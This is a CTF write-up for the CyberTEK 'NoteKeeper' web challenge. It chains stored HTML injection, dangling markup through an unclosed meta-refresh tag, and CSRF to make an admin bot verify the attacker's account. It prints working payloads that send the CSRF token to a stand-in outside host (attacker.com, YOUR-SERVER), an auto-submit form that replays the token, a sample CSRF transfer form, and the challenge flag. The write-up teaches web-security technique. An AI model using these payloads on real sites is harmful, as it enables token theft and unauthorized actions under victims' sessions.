---
layout: post
title: "CyberTEK CTF — NoteKeeper Web Challenge Writeup"
date: 2026-05-04
category: ctf
difficulty: medium
platform: CyberTEK
tags: [web, xss, csrf, dangling-markup, csp-bypass, ctf]
description: "Chaining Dangling Markup Injection and CSRF to steal a CSRF token and get an admin bot to verify our account — without executing a single line of JavaScript."
---

## The Challenge

**NoteKeeper** is a note-taking app where you can write notes, share them, and report them to an admin bot. The flag is only visible to users with `status == "verified"`. New users start as `pending`. Only the admin can verify accounts.

The goal: get the admin to verify our account.

---

## Recon

The app has four key routes:

- `POST /note/new` — create a note (content stored as-is)
- `GET /note/<uuid>` — view a note
- `POST /verify/<username>` — admin-only: set a user's status to `"verified"`
- `POST /report` — report a note UUID; the bot visits `/note/<uuid>` as admin

---

## Source Code Analysis

### The XSS Sink

In `note_view.html`, note content is rendered with Jinja2's `| safe` filter:

```html
<div class="note-content">{{ note.content | safe }}</div>
```

No sanitization. Any HTML we put in a note is rendered raw in the browser.

### The CSRF Form

Still in `note_view.html`, there's a verify form that the admin can use to verify the note's author. It's rendered for **every visitor**, including the admin bot:

```html
<form id="verify-form" method="POST" action="/verify/{{ note.author.username }}">
  <input type="hidden" value="{{ csrf_token() }}" name='csrf_token'>
</form>
```

Two things to notice:
1. The form action targets the **note author** — so whoever writes the note gets verified when the form submits.
2. The CSRF token is **already embedded** in the page HTML for the admin's session.

### The CSP — No Scripts Allowed

In `app/__init__.py`, the CSP header is:

```
default-src 'none';
style-src 'nonce-{nonce}';
form-action 'self';
base-uri 'none';
```

- `default-src 'none'` with no `script-src` override → **all scripts are blocked**
- `form-action 'self'` → forms can only POST to the same origin ✅
- No `navigate-to` directive → **`<meta http-equiv="refresh">` is unrestricted**

We can't run JavaScript. But we can navigate the bot with a meta refresh.

---

## Background: What is CSRF?

**Cross-Site Request Forgery (CSRF)** is an attack where a malicious page tricks a victim's browser into making a request to another site — **using the victim's session**.

Here's the classic scenario:

1. Alice is logged into `bank.com`. Her browser holds a session cookie for it.
2. Alice visits `evil.com`, which contains a hidden form:
   ```html
   <form method="POST" action="https://bank.com/transfer">
     <input name="amount" value="1000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit()</script>
   ```
3. Her browser submits the form to `bank.com` — with her session cookie attached automatically.
4. The bank sees a valid authenticated request and processes the transfer.

Alice never intended to do this. The attack worked because the browser automatically sends cookies for any request to a domain, regardless of which page triggered it.

### The Defense: CSRF Tokens

To stop this, servers issue a **CSRF token** — a random secret tied to the user's session. It's embedded as a hidden field in every sensitive form:

```html
<input type="hidden" name="csrf_token" value="a3f9...random...b2c1">
```

When the form is submitted, the server checks that the token matches. A cross-origin attacker can't read the token (blocked by the browser's Same-Origin Policy), so they can't forge a valid request.

### The Catch

CSRF tokens only protect you if **the attacker can't read them**. If an attacker can somehow extract the token from the page — via XSS, dangling markup, or any other leak — the protection collapses entirely.

That's exactly what we do in this challenge.

---

## The Vulnerability: Dangling Markup Injection

Since scripts are blocked, we need a way to make the admin bot perform the verify POST **without JavaScript**. The trick is to steal the CSRF token from the page first, then use it.

### What is Dangling Markup Injection?

When an HTML injection doesn't close its attribute properly, the browser's HTML parser keeps reading forward as part of the attribute value — "dangling" into the rest of the page. This lets an attacker capture subsequent page content (like a CSRF token) inside an attribute value and send it to an attacker-controlled server.

**Example:** if a page contains:

```html
[INJECTION POINT]
<input type="hidden" value="SECRET_TOKEN" name="csrf_token">
```

And we inject:

```html
<img src="https://attacker.com/?x=
```

The parser sees an unclosed `src` attribute. It reads forward until the next `"` — which is the closing quote of `value="SECRET_TOKEN"`. The browser tries to load:

```
https://attacker.com/?x=\nSECRET_TOKEN
```

The token is now in the attacker's server logs.

### Applying It Here

In `note_view.html`, our injection point (the note content) comes **before** the verify form. The rendered HTML looks like:

```html
<div class="note-content">[OUR INJECTION]</div>
...
<form id="verify-form" method="POST" action="/verify/attacker">
  <input type="hidden" value="THE_CSRF_TOKEN" name='csrf_token'>
</form>
```

We inject a `<meta http-equiv="refresh">` with an unclosed `content` attribute:

```html
<meta http-equiv="refresh" content='0; url=https://attacker.com/?x=
```

The parser reads this as the `content` attribute value, then keeps consuming HTML until it hits the next `'`. The bot's browser navigates to:

```
https://attacker.com/?x=...\n...<input type="hidden" value=THE_CSRF_TOKEN
```

The CSRF token arrives at our server in the URL.

---

## The Full Attack Chain

### Step 1 — Register and Create the Note

Register as `attacker`. Create a note with the dangling markup payload:

```html
<meta http-equiv="refresh" content='0; url=https://YOUR-SERVER/?x=
```

Note the unclosed `content` attribute — that's intentional.

### Step 2 — Report the Note

Go to `/report`, submit the note's UUID. The bot logs in as admin and visits `/note/<uuid>`.

### Step 3 — Token Arrives at Your Server

The bot's browser fires the meta refresh and navigates to your server. The URL contains the CSRF token buried in the query string:

```
GET /?x=%0A%3Cinput+type%3D%22hidden%22+value%3DTHE_CSRF_TOKEN
```

### Step 4 — Serve a Form That Uses the Token

Your server extracts the CSRF token from the URL and responds with a page that auto-submits a verify POST back to the challenge, using the bot's still-active admin session:

```html
<html>
<body>
<form id="f" method="POST" action="http://127.0.0.1:8080/verify/attacker">
  <input name="csrf_token" value="EXTRACTED_TOKEN">
</form>
<script>document.getElementById('f').submit()</script>
</body>
</html>
```

The bot (still authenticated as admin) loads this page. The form submits to `/verify/attacker` with the valid CSRF token and the admin's session cookie. The challenge accepts it and sets `attacker`'s status to `"verified"`.


### Step 5 — Get the Flag

Log in as `attacker`. The flag is displayed on the homepage and on any note view page.

---

## What Happens Under the Hood

```
Step 1: Attacker creates note with unclosed <meta> tag
            │
            ▼
Step 2: Bot visits /note/<uuid> as admin
            │
            ▼
Step 3: HTML parser sees unclosed content=' attribute
        → consumes page HTML until next quote
        → CSRF token leaks into the meta refresh URL
            │
            ▼
Step 4: Bot navigates to attacker's server with token in URL
            │
            ▼
Step 5: Attacker's server extracts token, serves auto-submit form
            │
            ▼
Step 6: Bot (as admin) submits POST /verify/attacker with valid CSRF token
            │
            ▼
Step 7: attacker's status → "verified" → flag revealed
```

---

## Why `<script>` Alone Doesn't Work

The CSP blocks all scripts on the challenge domain:

```
default-src 'none';   ← no script-src → scripts blocked
```

A naive `<script>document.getElementById('verify-form').submit()</script>` is killed by the browser before it runs. We need a **markup-only** approach — no JS on the challenge origin.

The `<meta http-equiv="refresh">` tag is a navigation primitive, not a script. The CSP has no `navigate-to` directive to restrict it, so it fires freely.

---

## Key Concepts

| Concept | How It Appears Here |
|---|---|
| Stored XSS sink | `{{ note.content \| safe }}` renders raw HTML |
| Dangling Markup Injection | Unclosed `<meta content="` leaks subsequent HTML to attacker |
| CSRF token theft | Token captured in dangling meta refresh URL |
| Cross-origin form submit | Bot uses its admin session to POST from attacker's page |
| CSP bypass | `<meta>` navigation is unrestricted; JS runs freely on attacker's server |

---

## Flag

```
CyberTEK{dangl_dangl_to_reach_it_from_the_outside}
```
